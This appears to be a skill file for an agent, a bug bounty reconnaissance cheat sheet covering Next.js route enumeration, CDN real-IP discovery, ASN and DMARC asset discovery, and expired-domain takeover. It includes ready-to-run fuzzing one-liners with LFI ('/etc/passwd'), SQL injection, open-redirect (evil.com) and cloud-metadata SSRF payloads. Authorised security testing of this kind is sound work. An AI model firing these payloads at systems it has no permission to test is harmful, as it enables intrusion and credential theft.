---
name: "h1-advanced-recon-techniques"
description: "Advanced bug bounty recon techniques from Jason Haddix, AmrElsagaei, sehno, mrvcoder, Swisskyrepo — Next.js manifest enum, qsreplace fuzzing, DOM sinks, backup files, CDN bypass, favicon hash, ASN recon, DMARC discovery, JS domain registration"
category: web-security
tags: ["recon", "nextjs", "cdn-bypass", "dom-xss", "backup-files", "asn", "favicon", "dnstools", "hackerone"]
relevance: 10
---

# Advanced Bug Bounty Recon Techniques

## 1. Next.js Route Enumeration (CRITICAL)
Next.js exposes ALL routes including `[slug]` dynamic params:

```
GET /__BUILD_MANIFEST         → sortedPages array
GET /_next/static/__BUILD_MANIFEST
GET /__NEXT_DATA__             → props.page + buildId
```

Check `window.__BUILD_MANIFEST.sortedPages` in JS console.
This reveals hidden API routes: `/api/admin/[id]`, `/api/internal/[secret]`

## 2. Mass Parameter Fuzzing (qsreplace)
Replace ALL URL params automatically:

```bash
# LFI scan across all params
cat urls.txt | qsreplace "../../../../etc/passwd" | xargs curl -s | grep "root:"

# Open redirect scan  
cat urls.txt | qsreplace "https://evil.com" | xargs curl -Is | grep "evil.com"

# SQLi scan
cat urls.txt | qsreplace "' OR '1'='1" | xargs curl -s | grep -i "sql\|syntax"

# SSRF scan
cat urls.txt | qsreplace "http://169.254.169.254/latest/meta-data/" | xargs curl -s
```

## 3. Reflected XSS Detection (kxss / gxss)
```bash
# Auto-detect reflected params
cat urls.txt | kxss         # Shows reflection context (<>, ", ')

# Blind param discovery
gxss -c 100 -p XssReflected | kxss
```

## 4. DOM Sink Detection in JS
Find dangerous JS sinks automatically:
```
innerHTML, outerHTML, document.write, eval(),
postMessage, dangerouslySetInnerHTML,
v-html, insertAdjacentHTML, createContextualFragment
```

## 5. Backup File Scanner (bfac)
Check for exposed backup files:
```
/config.php.bak, /.env.old, /index.php~, /db.sql.swp
/app.js.orig, /config.old, /credentials.txt, /backup.tar.gz
```

## 6. CDN/Cloudflare Real IP Bypass
```bash
# Shodan InternetDB
curl https://internetdb.shodan.io/<domain>

# Check subdomains on different IPs
mail.target.com, ftp.target.com, direct.target.com

# Favicon hash → Shodan
python3 -c "import mmh3; import requests; print(mmh3.hash(requests.get('https://target.com/favicon.ico').content))"
→ Search on Shodan: http.favicon.hash:<hash>
```

## 7. ASN-Based Asset Discovery
```bash
amass intel -asn <ASN_NUMBER>           # All ranges in ASN
shodan search "net:<CIDR_RANGE>"         # All exposed services
```

## 8. DMARC-Based Asset Discovery
```bash
# Find hidden assets via shared DMARC policy
curl https://dmarc.live/info/<domain>
# Same DMARC policy → same organization → related domains
```

## 9. JS Domain Registration Attack
1. Find domains in JS files (linkfinder/jsubfinder)
2. Check if they're available to register: `whois <domain>`
3. Register expired domain → subdomain takeover / clickjacking

## 10. Payment Testing — Stripe Test Cards
```
Visa: 4242 4242 4242 4242
Mastercard: 5555 5555 5555 4444
Amex: 3782 822463 10005
Discover: 6011 1111 1111 1117
```

## Tool Chain Workflow:
```
target.com
  │
  ├─ ASN + Shodan + Censys → IP ranges + exposed services
  ├─ Subfinder + gotator + dnsgen → subdomains
  ├─ httpx → live hosts
  │
  ├─ gospider + katana + gau → URL collection
  │   ├─ kxss/gxss → reflected XSS
  │   ├─ qsreplace → mass LFI/OR/SQLi fuzzing
  │   ├─ bfac → backup files
  │   └─ jsAlert → DOM sinks
  │
  ├─ Next.js manifest → hidden API routes
  ├─ Favicon hash → Shodan → real IP
  ├─ DMARC live → related domains
  └─ JS domains → register expired → takeover
```
